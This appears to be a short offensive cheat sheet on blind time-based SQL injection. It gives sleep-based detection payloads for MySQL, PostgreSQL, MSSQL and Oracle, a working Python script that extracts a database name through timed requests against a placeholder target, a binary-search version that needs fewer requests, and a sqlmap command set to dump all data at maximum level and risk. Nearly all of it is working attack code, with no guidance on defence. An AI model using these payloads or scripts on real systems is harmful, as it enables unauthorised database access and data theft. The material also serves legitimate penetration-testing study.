# Blind Time-Based SQL Injection Extraction

Extracting data from databases when no visible output is returned, only timing.

## Detection

```sql
' AND SLEEP(5)-- -           -- MySQL
' AND pg_sleep(5)-- -         -- PostgreSQL
' WAITFOR DELAY '0:0:5'-- -   -- MSSQL
' AND 1=CASE WHEN 1=1 THEN dbms_pipe.receive_message(('a'),5) ELSE 0 END-- -  -- Oracle
```

## Extraction Script

```python
import requests
import time
import string

url = "https://target.com/search"
charset = string.printable

def extract_char(pos, known=""):
    for c in charset:
        # MySQL: extract substring and compare
        payload = f"' AND IF(SUBSTRING(database(),{pos},1)='{c}',SLEEP(2),0)-- -"
        start = time.time()
        r = requests.get(url, params={"q": payload})
        if time.time() - start > 2:
            return c
    return None

def extract_string(max_len=50):
    result = ""
    for i in range(1, max_len + 1):
        c = extract_char(i, result)
        if c is None:
            break
        result += c
        print(f"[{i}] {result}")
    return result

db_name = extract_string()
print(f"Database: {db_name}")
```

## Binary Search Optimization

```python
def extract_char_binary(pos):
    low, high = 32, 126  # printable ASCII range
    while low < high:
        mid = (low + high) // 2
        payload = f"' AND IF(ASCII(SUBSTRING(database(),{pos},1))>{mid},SLEEP(2),0)-- -"
        start = time.time()
        requests.get(url, params={"q": payload})
        if time.time() - start > 2:
            low = mid + 1
        else:
            high = mid
    return chr(low)

# ~7 requests per char instead of ~95
```

## sqlmap One-Liner

```bash
sqlmap -u "https://target.com/search?q=test"   --technique=T   --level=5 --risk=3   --threads=4   --batch   --dump
```
